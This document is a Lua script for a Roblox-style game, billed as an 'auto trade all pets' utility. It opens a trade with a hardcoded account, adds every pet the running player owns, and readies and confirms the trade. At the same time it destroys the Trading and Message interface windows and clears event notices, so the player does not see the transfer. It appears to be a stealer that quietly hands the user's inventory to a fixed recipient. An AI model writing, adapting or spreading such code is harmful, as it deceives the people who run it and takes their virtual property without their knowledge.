--// AUTO TRADE ALL PETS (FIXED STABLE VERSION)

_G.CLEANING = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local pg = player:WaitForChild("PlayerGui")

local T = workspace.__REMOTES.Game.Trading

local alt = "nolokololol"
local lastTradeId = nil

--////////////////////////////////////////////////////
-- SAFE CLEANERS (НЕ ЛАМАЮТЬ REMOTES)
--////////////////////////////////////////////////////

task.spawn(function()
  while _G.CLEANING do

    local events = pg:FindFirstChild("Events")
    if events then
      pcall(function()
        events:ClearAllChildren()
      end)
    end

    task.wait(1)
  end
end)

task.spawn(function()
  while _G.CLEANING do

    local debris = workspace:FindFirstChild("__DEBRIS")
    if debris then
      for _, v in ipairs(debris:GetChildren()) do
        if v:IsA("BasePart") then
          pcall(function()
            v:Destroy()
          end)
        end
      end
    end

    task.wait(2)
  end
end)

--////////////////////////////////////////////////////
-- GUI BLOCK (Trading + Message)
--////////////////////////////////////////////////////

local blocked = {
  Trading = true,
  Message = true
}

local function removeGui(v)
  if v:IsA("ScreenGui") and blocked[v.Name] then
    pcall(function()
      v:Destroy()
    end)
  end
end

for _, v in pairs(pg:GetDescendants()) do
  removeGui(v)
end

pg.DescendantAdded:Connect(function(v)
  removeGui(v)
end)

--////////////////////////////////////////////////////
-- TRADE ID
--////////////////////////////////////////////////////

game:FindFirstChild("Trade Update", true).OnClientEvent:Connect(function(id)
  lastTradeId = id
end)

--////////////////////////////////////////////////////
-- SAVE / PETS
--////////////////////////////////////////////////////

local function getsave()
  return workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save
end

local function getpets()
  return getsave().Pets
end

--////////////////////////////////////////////////////
-- START TRADE
--////////////////////////////////////////////////////

repeat
  task.wait(0.2)
until T:InvokeServer("InvSend", game.Players[alt]) == true

repeat
  task.wait()
until lastTradeId

task.wait(1)

--////////////////////////////////////////////////////
-- ADD PETS
--////////////////////////////////////////////////////

for _, p in pairs(getpets()) do
  if p and p.id then
    task.spawn(function()
      pcall(function()
        T:InvokeServer("Add", lastTradeId, p.id)
      end)
    end)
  end
end

task.wait(2)

--////////////////////////////////////////////////////
-- READY
--////////////////////////////////////////////////////

pcall(function()
  T:InvokeServer("Ready", lastTradeId)
end)

task.wait(2)

--////////////////////////////////////////////////////
-- CONFIRM
--////////////////////////////////////////////////////

pcall(function()
  T:InvokeServer("Confirm", lastTradeId)
end)